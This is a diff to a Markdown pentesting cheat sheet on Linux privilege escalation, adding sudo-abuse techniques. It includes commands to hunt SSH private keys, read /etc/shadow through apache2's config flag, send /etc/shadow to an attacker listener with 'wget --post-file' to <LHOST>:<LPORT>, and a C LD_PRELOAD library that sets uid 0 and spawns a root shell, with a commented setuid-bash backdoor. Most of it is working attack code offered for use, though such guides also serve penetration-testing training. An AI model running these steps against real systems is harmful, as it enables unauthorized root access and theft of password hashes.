@@ -97,7 +97,7 @@ find / -name authorized_keys 2>/dev/null
 find / -name id_rsa 2>/dev/null
 ```
 
-## Backups
+### Backups
 
 Look for interesting files, also backups can be found in these locations.
 
@@ -107,17 +107,21 @@ ls -la /tmp
 ls -la /var/backups
 ```
 
-## Sudo
+## Sudo misconfigurations
+
+Sudo is used to run programs as an another user, by default it's root.
 
 ```text
-# Run a program as a specific user: 
 sudo -u <user> <program>
+```
 
-# List programs a user is allowed (and disallowed) to run:
+You can list programs which can be run without requiring password.
+
+```text
 sudo -l
 ```
 
-Other ways to escalate privileges with sudo:
+Some ways to escalate privileges with unrestricted sudo:
 
 ```text
 sudo -s
@@ -126,10 +130,61 @@ sudo /bin/bash
 sudo passwd
 ```
 
-Shell escape sequences for more programs can be found here:
+Shell escape sequences can be found here: [https://gtfobins.github.io/](https://gtfobins.github.io/)
+
+### "Intended functionality"
+
+Some program's intended functionality can also help you to escalate privileges. Always google for possible privilege escalations using programs you have access to.
+
+#### apache2 example
+
+When you run apache as a root, you can provide configuration file with a `-f` flag. When a file is not in correct format, apache2 will print first line of a file in error message. We can use this to read first line of a `/etc/shadow` file \(root's hash\) and crack it.
 
 ```text
-https://gtfobins.github.io/
+sudo apache2 -f /etc/shadow
+```
+
+#### wget example
+
+Wget command can not only download files, but also post files to webserver.
+
+You can setup netcat listener on your machine and then by running this command on target machine, will send `/etc/shadow` your way.
+
+```text
+sudo wget --post-file=/etc/shadow <LHOST>:<LPORT>
+```
+
+### LD\_PRELOAD
+
+When LD\_PRELOAD enviroment variable is set and you run the executable, ld will first run specified library and only after that will execute original program. 
+
+Firstly we create source code file for a shared object.
+
+{% code title="shell.c" %}
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+void _init(){
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash"); // "cp /bin/bash /tmp/yzbash; chmod +s /tmp/yzbash"
+}
+```
+{% endcode %}
+
+Then compile this C code as a shared object.
+
+```text
+gcc -fPIC -shared -o shell.so shell.c -nostartfile
+```
+
+Preload this shared object when you run executable you have permission to run with sudo.
+
+```text
+sudo LD_PRELOAD=<path_to_your_so_file> <executable_you_can_run_with_sudo>
 ```
 
 ## Cron jobs
